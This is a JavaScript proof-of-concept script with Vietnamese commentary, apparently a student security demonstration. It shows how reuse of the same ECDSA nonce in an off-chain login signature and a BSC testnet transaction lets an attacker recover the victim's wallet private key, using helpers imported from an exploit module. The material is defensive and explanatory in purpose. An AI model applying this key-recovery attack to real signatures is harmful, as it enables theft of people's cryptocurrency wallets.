/**
 * KỊCH BẢN 3 (MỞ RỘNG): TẤN CÔNG VA CHẠM NONCE CHÉO
 * GIỮA CHỮ KÝ XÁC THỰC NGOÀI CHUỖI (OFF-CHAIN EIP-191) VÀ GIAO DỊCH TRÊN CHUỖI (ON-CHAIN BSC)
 * 
 * - Nạn nhân ký thông điệp đăng nhập Cổng thông tin Web3 (Off-chain EIP-191 personal_sign)
 * - Nạn nhân ký giao dịch chuyển tiền trên mạng BSC Testnet (On-chain EIP-155 Transaction)
 * - Lỗi PRNG khiến cả hai thao tác dùng chung một tham số Nonce k
 * - Hacker thu thập 2 chữ ký công khai từ 2 kênh độc lập (Web API và BSC Block)
 * - Kích hoạt Thuật toán Euclid mở rộng giải hệ phương trình đồng dư bậc nhất khôi phục Private Key
 */
import { hexToBigInt, formatEther, parseEther } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { performance } from 'perf_hooks';
import { CONFIG } from './config.mjs';
import { signTransactionWithFixedNonce, signMessageWithFixedNonce } from './signer.mjs';
import { recoverPrivateKeyFromNonceReuse } from './exploit.mjs';

async function main() {
  console.log('================================================================');
  console.log('  KỊCH BẢN 3: TẤN CÔNG VA CHẠM NONCE CHÉO OFF-CHAIN & ON-CHAIN ');
  console.log('  Chữ ký Đăng nhập dApp Web3  <--->  Giao dịch Chuỗi khối BSC   ');
  console.log('================================================================\n');

  const victimAccount = privateKeyToAccount(CONFIG.victimPrivateKey);
  const victimPrivateKey = hexToBigInt(CONFIG.victimPrivateKey);
  const fixedK = CONFIG.fixedNonceK;

  console.log(`[+] Thông tin ví mục tiêu:`);
  console.log(`    - Địa chỉ ví (Address) : ${victimAccount.address}`);
  console.log(`    - Khóa bí mật (PrivKey): ${CONFIG.victimPrivateKey}`);
  console.log(`    - Tham số Nonce k cố định: 0x${fixedK.toString(16)}\n`);

  // -------------------------------------------------------------
  // GIAI ĐOẠN 1: NẠN NHÂN KÝ XÁC THỰC ĐĂNG NHẬP DAPP NGOÀI CHUỖI (OFF-CHAIN)
  // -------------------------------------------------------------
  console.log(`[1] NẠN NHÂN KÝ THÔNG ĐIỆP ĐĂNG NHẬP DAPP (EIP-191 PERSONAL SIGN)`);
  const loginMessage = 'Xac thuc dang nhap Cong Sinh vien PTIT Web3 - Nonce: 883921';
  console.log(`    - Nội dung thông điệp : "${loginMessage}"`);

  const offchainSig = signMessageWithFixedNonce(loginMessage, victimPrivateKey, fixedK);
  console.log(`    - Bản băm EIP-191 (e1): ${offchainSig.msgHash}`);
  console.log(`    - Chữ ký r (Off-chain): ${offchainSig.r}`);
  console.log(`    - Chữ ký s1(Off-chain): ${offchainSig.s}`);
  console.log(`    - Phục hồi v          : ${offchainSig.v}`);
  console.log(`    -> Trạng thái: Chữ ký gửi lên Web API máy chủ dApp (Lưu nhật ký công khai)\n`);

  // -------------------------------------------------------------
  // GIAI ĐOẠN 2: NẠN NHÂN GỬI GIAO DỊCH CHUYỂN TIỀN TRÊN CHUỖI (ON-CHAIN)
  // -------------------------------------------------------------
  console.log(`[2] NẠN NHÂN GỬI GIAO DỊCH CHUYỂN TIỀN TRÊN MẠNG BSC TESTNET`);
  const txPayload = {
    chainId: CONFIG.chainId,
    nonce: 10,
    gas: 21000n,
    gasPrice: 10000000000n, // 10 Gwei
    to: '0x0000000000000000000000000000000000000001',
    value: parseEther('0.001')
  };

  const onchainSig = signTransactionWithFixedNonce(txPayload, victimPrivateKey, fixedK);
  console.log(`    - Bản băm RLP (e2)    : ${onchainSig.msgHash}`);
  console.log(`    - Chữ ký r (On-chain) : ${onchainSig.r}`);
  console.log(`    - Chữ ký s2(On-chain) : ${onchainSig.s}`);
  console.log(`    - Phục hồi v          : ${onchainSig.v}`);
  console.log(`    -> Trạng thái: Giao dịch được xác nhận và đóng vào khối trên BSC Testnet\n`);

  // -------------------------------------------------------------
  // GIAI ĐOẠN 3: HACKER THU THẬP DỮ LIỆU VÀ PHÁT HIỆN ĐỐI KHỚP R
  // -------------------------------------------------------------
  console.log(`[3] HACKER GIÁM SÁT VÀ PHÁT HIỆN TRÙNG LẶP HOÀNH ĐỘ r`);
  console.log(`    - r từ Web API Log    : ${offchainSig.r}`);
  console.log(`    - r từ BSC Testnet Tx : ${onchainSig.r}`);

  const isCollision = offchainSig.r.toLowerCase() === onchainSig.r.toLowerCase();
  console.log(`    -> Phát hiện va chạm r: ${isCollision ? 'CÓ (TRÙNG KHỚP 100%)' : 'KHÔNG'}`);

  if (!isCollision) {
    console.error('[!] Không phát hiện va chạm r. Kịch bản dừng.');
    return;
  }

  console.log(`\n================================================================`);
  console.log(`[🚨 BÁO ĐỘNG] PHÁT HIỆN VA CHẠM NONCE k GIỮA DAPP VÀ BLOCKCHAIN!`);
  console.log(`    - Bản băm thông điệp đăng nhập e1: ${offchainSig.msgHash}`);
  console.log(`    - Bản băm giao dịch chuỗi khối e2: ${onchainSig.msgHash}`);
  console.log(`    - Giá trị r dùng chung           : ${offchainSig.r}`);
  console.log(`================================================================\n`);

  // -------------------------------------------------------------
  // GIAI ĐOẠN 4: THÁM MÃ ĐẠI SỐ BẰNG THUẬT TOÁN EUCLID MỞ RỘNG
  // -------------------------------------------------------------
  console.log(`[4] HACKER KÍCH HOẠT THUẬT TOÁN EUCLID MỞ RỘNG KHÔI PHỤC KHÓA BÍ MẬT...`);

  const tStart = performance.now();
  const result = recoverPrivateKeyFromNonceReuse(
    offchainSig.eBigInt,
    onchainSig.eBigInt,
    offchainSig.rBigInt,
    offchainSig.sBigInt,
    onchainSig.sBigInt,
    victimAccount.address
  );
  const totalDurationMs = performance.now() - tStart;

  const recoveredAccount = privateKeyToAccount(result.recoveredPrivateKeyHex);
  const isMatch = recoveredAccount.address.toLowerCase() === victimAccount.address.toLowerCase();

  console.log(`\n================================================================`);
  console.log(`  KẾT QUẢ THÁM MÃ VA CHẠM CHÉO OFF-CHAIN <-> ON-CHAIN            `);
  console.log(`================================================================`);
  console.log(`- Nonce k giải được        : 0x${result.recoveredK.toString(16)}`);
  console.log(`- Private Key khôi phục (d): ${result.recoveredPrivateKeyHex}`);
  console.log(`- Private Key gốc của ví   : ${CONFIG.victimPrivateKey}`);
  console.log(`- Địa chỉ ví suy dẫn       : ${recoveredAccount.address}`);
  console.log(`- Địa chỉ ví mục tiêu      : ${victimAccount.address}`);
  console.log(`- Kiểm chứng tính khớp     : ${isMatch ? 'CHÍNH XÁC 100% (KHỚP HOÀN TOÀN)' : 'THẤT BẠI'}`);
  console.log(`- Thời gian giải Euclid    : ${result.euclidTimeMs.toFixed(4)} mili-giây`);
  console.log(`- Tổng thời gian thực thi  : ${totalDurationMs.toFixed(4)} mili-giây`);
  console.log(`================================================================\n`);

  console.log(`[✔] Đánh giá an ninh: Kịch bản chứng minh người dùng chỉ cần một lần ký`);
  console.log(`    thông điệp đăng nhập Web3 bất cẩn với phần mềm lỗi Nonce k, Hacker`);
  console.log(`    hoàn toàn có thể kết hợp với giao dịch trên chuỗi để cướp toàn bộ ví!`);
}

main().catch(console.error);

